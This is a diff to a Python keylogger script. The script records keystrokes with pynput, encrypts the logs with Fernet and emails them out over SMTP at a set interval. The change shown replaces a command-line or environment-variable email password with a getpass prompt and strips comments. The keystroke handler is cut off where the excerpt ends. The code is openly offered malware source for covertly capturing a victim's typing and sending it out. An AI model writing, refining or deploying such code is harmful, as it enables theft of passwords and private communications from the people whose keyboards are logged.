@@ -1,4 +1,5 @@
 import argparse
+import getpass  
 import pynput.keyboard
 import smtplib
 import os
@@ -16,31 +17,34 @@ from cryptography.fernet import Fernet
 def parse_args():
     parser = argparse.ArgumentParser(description="Keylogger with email reporting")
     parser.add_argument("-e", "--email", help="Email address to send the logs to")
-    parser.add_argument("-p", "--password", help="Password for the email address")
     parser.add_argument("-i", "--interval", type=int, default=60, help="Interval (in seconds) for sending email reports")
     return parser.parse_args()
 
+def get_email_password():
+    return getpass.getpass("Enter the password for the email address: ")
+
 args = parse_args()
 
-# Extracting email and password from command-line arguments or environment variables
-email_address = args.email or os.getenv("EMAIL_ADDRESS")
-email_password = args.password or os.getenv("EMAIL_PASSWORD")
 
-if not email_address or not email_password:
-    print("Error: Email address and password are required.")
+email_address = args.email
+
+if not email_address:
+    print("Error: Email address is required.")
     exit()
 
-# Generate a key for encryption
+
+email_password = get_email_password()
+
 encryption_key = Fernet.generate_key()
 cipher_suite = Fernet(encryption_key)
 
-# Timer interval in seconds
+
 interval = args.interval
 
-# Create a variable to store the keystrokes
+
 keylogs = ""
 
-# Create a function to handle the keystrokes
+
 def on_press(key):
     global keylogs
     try:
